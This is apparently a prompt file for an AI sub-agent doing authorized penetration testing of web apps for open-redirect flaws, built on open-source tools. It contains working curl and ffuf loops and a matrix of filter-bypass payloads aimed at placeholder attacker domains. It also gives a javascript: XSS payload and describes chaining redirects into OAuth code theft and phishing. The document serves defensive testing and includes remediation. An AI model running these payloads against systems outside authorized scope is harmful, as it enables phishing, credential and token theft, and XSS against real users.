# Testing for open-redirect vulnerabilities

> OSS port of mukul975's `testing-for-open-redirect-vulnerabilities`. Burp was already one of several options; this version makes OSS (OWASP ZAP spider, ffuf, gf, OpenRedireX, nuclei, interact.sh) the primary path.

## Sub-agent mission

You are dispatched to identify and test open-redirect vulnerabilities in a target web app. You enumerate redirect parameters, apply bypass techniques, chain with other vulns (OAuth, phishing, XSS), and automate with OSS scanners. Report findings with severity, evidence, and the matching defensive plugin.

## Inputs

- **task:** the user's verbatim request (e.g. "our OAuth flow has `?redirect_uri=` — test it for open redirect").
- **target / scope:** base URL + in-scope routes. Confirmed by the orchestrator's gate.
- **ack_state:** `confirmed` for live-target; `n/a` for static code review of redirect logic.
- **context (optional):** known redirect params, framework, OAuth config.

## Tools

```bash
# Install (documentation only)
brew install ffuf nuclei                    # or go install github.com/ffuf/ffuf/v2@latest
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
pipx install OpenRedireX                    # or: git clone https://github.com/devanshbatham/OpenRedireX
# gf (param extraction) — requires tomnomnom/gf
go install github.com/tomnomnom/gf@latest
git clone https://github.com/tomnomnom/gf.git ~/.gf-source && cp -r ~/.gf-source/examples ~/.gf
```

For the paid→OSS swap table (Burp Collaborator → interact.sh, etc.), `SEE: references/oss-tool-map.md`.

## Methodology

### Step 1 — Identify redirect parameters

Crawl the app with OWASP ZAP spider (replaces Burp crawl) and extract redirect-like params with `gf redirect`:

```bash
# Crawl
zap-cli spider https://TARGET/
zap-cli -v urls > crawled-urls.txt

# Extract redirect-like params
cat crawled-urls.txt | gf redirect > redirect-urls.txt
cat crawled-urls.txt | gf url > all-params.txt
```

Common redirect parameter names to grep for:

```
redirect redirect_uri redirect_url redirect_to next url return returnurl return_url
goto dest destination continue target callback redir rurl image_url
```

### Step 2 — Test basic payloads

Set up an interact.sh client for out-of-band confirmation (replaces Burp Collaborator):

```bash
interactsh-client >& interactsh.log &
# Capture the interact.sh domain from the log
INTERACT_DOMAIN=$(grep -oE '[a-zA-Z0-9.-]+\.oast\.(pro|live|site|fun|me)' interactsh.log | head -1)
```

Test each suspected redirect param:

```bash
TARGET="https://TARGET/login?next=FUZZ"
for payload in "https://$INTERACT_DOMAIN" "//$INTERACT_DOMAIN" "/$INTERACT_DOMAIN" \
               "https://$INTERACT_DOMAIN/" "https:$INTERACT_DOMAIN" "$INTERACT_DOMAIN"; do
  echo "==> next=$payload"
  curl -sk -o /dev/null -w "%{http_code} -> %{redirect_url}\n" \
       "https://TARGET/login?next=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")"
done
```

A hit on the interact.sh dashboard confirms an open redirect.

### Step 3 — Apply validation-bypass techniques

Apps that block absolute URLs often fall to these bypass patterns. Try each:

```bash
PAYLOADS=(
  "//ATTACKER.com"                          # protocol-relative
  "https:ATTACKER.com"                      # missing slashes
  "https:///ATTACKER.com"                   # triple slash
  "/\ATTACKER.com"                          # backslash
  "https://ATTACKER.com/example.com"        # trusted-domain substring
  "https://example.com@ATTACKER.com"        # userinfo trick
  "//ATTACKER.com\\@example.com"            # backslash + at
  "https://example.com.attacker.com"        # subdomain trick
  "javascript://example.com/%0Aalert(1)"    # JS scheme + newline
  "//ATTACKER.com/?next=example.com"        # double-redirect chain
)
for p in "${PAYLOADS[@]}"; do
  echo "==> $p"
  curl -sk -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "https://TARGET/login?next=$(urlencode "$p")"
done
```

(`urlencode` can be a bash function calling `python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))"`.)

### Step 4 — Test path-based redirects

Some apps redirect based on path rather than query param:

```bash
for path in "//ATTACKER.com" "/redirect/ATTACKER.com" "/go?to=//ATTACKER.com"; do
  curl -sk -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "https://TARGET$path"
done
```

### Step 5 — Chain with other vulns

Open redirect becomes more severe when chained:

- **OAuth flow hijack** — if `redirect_uri` is open, an attacker can capture authorization codes.
- **Phishing escalation** — a trusted-domain redirect to attacker.com lures victims.
- **XSS via `javascript:` scheme** — if `javascript://trusted.com/%0Aalert(1)` redirects, you have XSS.
- **SSRF via redirect** — server-side fetches that follow redirects can be pivoted to internal targets.

Document each chain explicitly in the finding's evidence.

### Step 6 — Automate with OSS scanners

```bash
# OpenRedireX (wordlist-driven)
python3 openredirex.py -u "https://TARGET/login?next=FUZZ" \
                       -w payloads.txt \
                       --match "ATTACKER.com"

# Nuclei with the open-redirect template
nuclei -u https://TARGET/ -t ~/nuclei-templates/http/vulnerabilities/generic/open-redirect.yaml

# ffuf pattern-match on Location headers
ffuf -u "https://TARGET/login?next=FUZZ" \
     -w redirect-payloads.txt \
     -mr "Location: .*ATTACKER" \
     -t 20
```

## Common mistakes

- **Only testing absolute URLs.** Most modern apps block `https://attacker.com` but fall to `//attacker.com` or `https:attacker.com`. Always test the bypass matrix.
- **Forgetting server-side redirects.** A `Location` header in the response is a redirect only if the client follows it. Confirm with `curl` (which does not auto-follow unless `-L`) AND with a browser to verify real-world impact.
- **Reporting without confirmation.** A `Location` header that the app later overrides is not exploitable. Confirm with interact.sh or a controlled domain.
- **Ignoring the OAuth chain.** If the redirect param is in an OAuth flow, severity is critical even if the bare redirect is low.

## Quick reference — bypass payload matrix

| Bypass | Payload | Defeats |
|---|---|---|
| Protocol-relative | `//attacker.com` | URL-allowlist matching `https://` |
| Missing slashes | `https:attacker.com` | Strict `://` parsing |
| Triple slash | `https:///attacker.com` | Loose parsing |
| Backslash | `/\attacker.com` | Forward-slash-only blocking |
| Substring trick | `https://attacker.com/victim.com` | Substring allowlist |
| Userinfo | `https://victim.com@attacker.com` | Hostname-prefix allowlist |
| Trusted-domain suffix | `https://attacker.victim.com` | Naive `endswith` checks |
| JS scheme | `javascript://victim.com/%0Aalert(1)` | URL-redirect-only blocks → XSS |

## OWASP / MITRE references

- **OWASP A01:2021** — Broken Access Control.
- **MITRE ATT&CK** — T1190 (Exploit Public-Facing Application), T1059.007 (JavaScript), T1505.003 (Web Shell), T1083 (File and Directory Discovery), T1566 (Phishing).

## Remediation

`SEE: references/defensive-cross-refs.md`. Typical match: `defense-in-depth-validation` (validate redirect targets against an allowlist on the server).

## Sub-agent return contract

```json
{
  "findings": [
    {
      "vuln": "Open redirect in /login?next=",
      "severity": "high | medium | low",
      "evidence": "curl 'https://TARGET/login?next=//attacker.com' -> 302 Location: //attacker.com (confirmed via interact.sh hit)",
      "owasp": "A01:2021",
      "mitre": ["T1190", "T1566"],
      "remediation": "Server-side allowlist of permitted redirect targets; reject protocol-relative and userinfo payloads.",
      "defensive_plugin": "defense-in-depth-validation",
      "chains": ["OAuth authorization-code theft (if redirect_uri)", "Phishing escalation", "XSS via javascript: scheme"]
    }
  ],
  "summary": "Found 1 confirmed open redirect with 3 viable bypass techniques."
}
```
